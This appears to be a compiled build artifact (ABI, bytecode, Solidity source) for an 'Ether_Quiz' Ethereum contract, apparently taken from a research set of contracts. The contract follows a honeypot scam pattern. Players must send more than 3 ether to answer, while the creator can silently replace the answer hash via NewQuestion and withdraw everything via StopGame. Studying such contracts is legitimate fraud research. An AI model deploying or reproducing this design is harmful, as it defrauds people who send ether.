{
  "contractName": "Ether_Quiz",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Try",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "initialize_ether_quiz",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506106aa806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633853682c1461006f5780633e3ee8591461009d5780633fad9ae01461010757806376bda92214610197578063f50ab24714610239575b005b61009b600480360381019080803590602001908201803590602001919091929391929390505050610243565b005b610105600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192908035600019169060200190929190505050610321565b005b34801561011357600080fd5b5061011c6103a3565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561015c578082015181840152602081019050610141565b50505050905090810190601f1680156101895780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610237600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610441565b005b61024161051d565b005b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561027d57600080fd5b818160405180838380828437820191505092505050604051809103902060001916600254600019161480156102b957506729a2241af62c000034115b1561031d573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561031b573d6000803e3d6000fd5b505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561037d57600080fd5b81600090805190602001906103939291906105d9565b5080600281600019169055505050565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156104395780601f1061040e57610100808354040283529160200191610439565b820191906000526020600020905b81548152906001019060200180831161041c57829003601f168201915b505050505081565b600060010260025460001916141561051957806040518082805190602001908083835b6020831015156104895780518252602082019150602081019050602083039250610464565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206002816000191690555081600090805190602001906104d69291906105d9565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561057957600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156105d6573d6000803e3d6000fd5b50565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061061a57805160ff1916838001178555610648565b82800160010185558215610648579182015b8281111561064757825182559160200191906001019061062c565b5b5090506106559190610659565b5090565b61067b91905b8082111561067757600081600090555060010161065f565b5090565b905600a165627a7a72305820c61193b5091278eb8a61ebee48274e9a2470bab2ca44aad475f919dd5a66adfc0029",
  "source": "\n\ncontract Ether_Quiz\n{\n    function Try(string _response)\n    external\n    payable\n    {\n        require(msg.sender == tx.origin);\n        \n        if(responseHash == keccak256(_response) && msg.value > 3 ether)\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    string public question;\n \n    address questionSender;\n  \n    bytes32 responseHash;\n \n    function initialize_ether_quiz(string _question,string _response)\n    public\n    payable\n    {\n        if(responseHash==0x0)\n        {\n            responseHash = keccak256(_response);\n            \n            question = _question;\n            \n            questionSender = msg.sender;\n        }\n    }\n    \n    function StopGame()\n    public\n    payable\n    {\n       require(msg.sender==questionSender);\n       \n       msg.sender.transfer(this.balance);\n    }\n    \n    function NewQuestion(string _question, bytes32 _responseHash)\n    public\n    payable\n    {\n        require(msg.sender==questionSender);\n        \n        question = _question;\n        \n        responseHash = _responseHash;\n    }\n    \n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x63d3d0215922b924c782c7b2a351ef8604e18da7/contracts/0x63d3d0215922b924c782c7b2a351ef8604e18da7.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:55:50.797Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}